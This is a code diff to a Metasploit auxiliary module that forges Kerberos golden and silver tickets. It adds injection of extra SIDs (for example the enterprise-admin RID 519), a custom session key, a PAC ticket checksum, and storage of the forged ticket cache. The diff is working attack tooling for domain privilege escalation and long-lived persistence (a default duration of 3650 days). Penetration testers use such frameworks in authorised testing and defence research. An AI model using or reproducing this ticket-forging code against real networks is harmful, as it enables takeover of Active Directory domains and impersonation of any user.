@@ -18,7 +18,8 @@ class MetasploitModule < Msf::Auxiliary
         },
         'Author' => [
           'Benjamin Delpy', # Original Implementation
-          'Dean Welch' # Metasploit Module
+          'Dean Welch', # Metasploit Module
+          'alanfoster' # Enhancements
         ],
         'References' => [
           %w[URL https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it]
@@ -46,10 +47,19 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),
         OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
         OptString.new('DOMAIN_SID', [ true, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962']),
+        OptString.new('EXTRA_SIDS', [ false, 'Extra sids separated by commas, Ex: S-1-5-21-1755879683-3641577184-3486455962-519']),
         OptString.new('SPN', [ false, 'The Service Principal Name (Only used for silver ticket)'], conditions: %w[ACTION == FORGE_SILVER]),
         OptInt.new('DURATION', [ true, 'Duration of the ticket in days', 3650]),
       ]
     )
+
+    register_advanced_options(
+      [
+        OptString.new('SessionKey', [ false, 'The session key, if not set - one will be generated' ]),
+        OptBool.new('IncludeTicketChecksum', [ false, 'Adds the Ticket Checksum to the PAC', false])
+      ]
+    )
+
     deregister_options('RHOSTS', 'RPORT', 'Timeout')
   end
 
@@ -68,10 +78,10 @@ class MetasploitModule < Msf::Auxiliary
 
   private
 
-  def forge_ccache(sname:, flags:)
+  def forge_ccache(sname:, flags:, is_golden:)
     enc_key, enc_type = get_enc_key_and_type
 
-    start_time = Time.now
+    start_time = Time.now.utc
     end_time = start_time + SECS_IN_DAY * datastore['DURATION']
 
     ccache = forge_ticket(
@@ -84,22 +94,27 @@ class MetasploitModule < Msf::Auxiliary
       domain: datastore['DOMAIN'],
       username: datastore['USER'],
       user_id: datastore['USER_RID'],
-      domain_sid: datastore['DOMAIN_SID']
+      domain_sid: datastore['DOMAIN_SID'],
+      extra_sids: extra_sids,
+      session_key: datastore['SessionKey'].blank? ? nil : datastore['SessionKey'].strip,
+      ticket_checksum: datastore['IncludeTicketChecksum'],
+      is_golden: is_golden
     )
+
+    Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, framework_module: self)
+
     if datastore['VERBOSE']
       print_ccache_contents(ccache, key: enc_key)
     end
   end
 
   def forge_silver
-    raise Msf::OptionValidateError, 'SPN' if datastore['SPN'].blank?
-
     validate_spn!
     validate_sid!
     validate_key!
     sname = datastore['SPN'].split('/', 2)
     flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(silver_ticket_flags)
-    forge_ccache(sname: sname, flags: flags)
+    forge_ccache(sname: sname, flags: flags, is_golden: false)
   end
 
   def forge_golden
@@ -107,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     validate_key!
     sname = ['krbtgt', datastore['DOMAIN'].upcase]
     flags = Rex::Proto::Kerberos::Model::TicketFlags.from_flags(golden_ticket_flags)
-    forge_ccache(sname: sname, flags: flags)
+    forge_ccache(sname: sname, flags: flags, is_golden: true)
   end
 
   def get_enc_key_and_type
@@ -131,7 +146,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def validate_spn!
     unless datastore['SPN'] =~ %r{.*/.*}
-      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid SPN - must be in the format .*/.*. Ex. <service class>/<host><realm>:<port>/<service name>')
+      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid SPN, must be in the format <service class>/<host><realm>:<port>/<service name>. Ex: cifs/host.realm.local')
     end
   end
 
@@ -155,5 +170,9 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['AES_KEY'].present? && (datastore['AES_KEY'].size != 32 && datastore['AES_KEY'].size != 64)
       fail_with(Msf::Exploit::Failure::BadConfig, "AES key length was #{datastore['AES_KEY'].size} should be 32 or 64")
     end
+  end
+
+  def extra_sids
+    (datastore['EXTRA_SIDS'] || '').split(',').map(&:strip).reject(&:blank?)
   end
 end
